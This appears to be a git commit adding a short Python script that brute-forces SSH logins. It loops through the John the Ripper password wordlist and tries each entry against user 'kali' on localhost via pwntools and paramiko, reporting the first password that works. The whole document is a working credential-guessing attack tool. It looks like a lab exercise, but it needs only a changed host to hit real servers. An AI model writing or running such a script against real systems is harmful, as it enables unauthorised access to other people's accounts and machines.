5a9a644a42bdca8e17e349a2ae1b4d54de42a169
maciasrcdaniel <maciasrcdaniel@gmail.com>
2024-01-09 19:38:52 -0800

    ssh bruteforce login script

---
+++ ssh_brute_force_login.py
@@ -0,0 +1,27 @@
+#!/usr/bin/env python3
+
+from pwn import *
+import paramiko
+
+host = "127.0.0.1"
+username = "kali"
+attempts = 0
+
+with open("/usr/share/wordlists/john.lst", "r") as password_lists:
+	for password in password_lists:
+		password = password.strip("\n")
+		try:
+			print("[{}] Attempting Password: {}".format(attempts, password))
+			response = ssh(host=host, user=username, password=password, timeout=1)
+			if response.connected():
+				print("[>] Valid Password Found: '{}'".format(password))
+				response.close()
+				break
+			response.close()
+		except paramiko.ssh_exception.AuthenticationException:
+			print("[X] Invalid Password!")
+		attempts += 1
+
+
+			
+
